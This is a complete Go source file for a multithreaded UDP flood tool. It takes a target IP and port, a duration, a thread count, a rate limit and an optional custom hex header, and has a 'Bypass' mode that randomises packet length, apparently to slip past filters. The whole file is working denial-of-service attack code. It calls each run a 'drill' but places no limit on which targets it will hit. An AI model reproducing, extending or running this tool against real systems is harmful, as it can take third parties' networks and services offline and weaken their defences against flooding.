package main

import (
	"context"
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"math/big"
	"net"
	"runtime"
	"sync"
	"time"

	flag "github.com/spf13/pflag"
)

var (
	target     string
	port       int
	threads    int
	size       int
	duration   int
	ppsLimit   int
	payloadHex string
	bypass     bool
)

func init() {
	flag.StringVarP(&target, "target", "t", "", "目标 IP (必填)")
	flag.IntVarP(&port, "port", "p", 80, "目标端口")
	flag.IntVarP(&threads, "threads", "c", runtime.NumCPU()*2, "并发线程数")
	flag.IntVarP(&size, "size", "s", 64, "基准包大小(bytes)")
	flag.IntVarP(&duration, "duration", "d", 60, "持续时间(秒)")
	flag.IntVarP(&ppsLimit, "limit", "l", 0, "PPS 限速 (0为不限)")
	flag.StringVarP(&payloadHex, "hex", "x", "", "自定义协议头 (Hex格式)")
	flag.BoolVarP(&bypass, "bypass", "B", false, "开启 Bypass 模式 (动态包长抖动)")
}

func main() {
	flag.Parse()
	if target == "" {
		fmt.Println("用法: ./utos -t <目标IP> [-d 持续秒数] [-B]")
		flag.Usage()
		return
	}

	// 1. 协议头解析
	var header []byte
	if payloadHex != "" {
		var err error
		header, err = hex.DecodeString(payloadHex)
		if err != nil {
			fmt.Printf("[-] Hex 解析失败: %v\n", err)
			return
		}
		if size < len(header) {
			size = len(header)
		}
	}

	// 2. 使用 Context 控制超时 (解决无法停止的问题)
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()

	fmt.Println("==================================================")
	fmt.Printf("[+] 目标: %s:%d | 线程: %d | 持续时间: %ds\n", target, port, threads, duration)
	fmt.Printf("[+] 模式: %s\n", func() string {
		if bypass {
			return "Bypass (动态长度)"
		}
		return "标准 UDP Flood"
	}())

	// 3. 样例包预览
	sample := make([]byte, size+32)
	if len(header) > 0 {
		copy(sample, header)
	}
	rand.Read(sample[len(header):size])
	fmt.Printf("[*] 样例包预览 (Hex): %s...\n", hex.EncodeToString(sample[:24]))
	fmt.Println("==================================================")

	// 4. 执行控制
	var wg sync.WaitGroup

	// 如果设置了限速，创建 Ticker
	var ticker *time.Ticker
	if ppsLimit > 0 {
		ticker = time.NewTicker(time.Second / time.Duration(ppsLimit))
		defer ticker.Stop()
	}

	fmt.Println("[!] 流量发送中...")
	startTime := time.Now()

	for i := 0; i < threads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			worker(ctx, header, size, ticker)
		}()
	}

	// 等待 Context 到期或所有协程退出
	wg.Wait()

	fmt.Printf("\n[+] 演练完成！实际运行时间: %v\n", time.Since(startTime))
	fmt.Println("[+] 所有发包协程已安全退出。")
}

func worker(ctx context.Context, header []byte, baseSize int, ticker *time.Ticker) {
	conn, err := net.Dial("udp", fmt.Sprintf("%s:%d", target, port))
	if err != nil {
		return
	}
	defer conn.Close()

	payload := make([]byte, baseSize+128)
	headerLen := len(header)
	if headerLen > 0 {
		copy(payload, header)
	}

	for {
		select {
		case <-ctx.Done(): // 广播信号，所有协程同时感知到并停止
			return
		default:
			if ticker != nil {
				<-ticker.C
			}

			currentSize := baseSize
			if bypass && baseSize > 32 {
				n, _ := rand.Int(rand.Reader, big.NewInt(32))
				currentSize = (baseSize - 16) + int(n.Int64())
			}

			if currentSize > headerLen {
				rand.Read(payload[headerLen:currentSize])
			}

			conn.Write(payload[:currentSize])
		}
	}
}
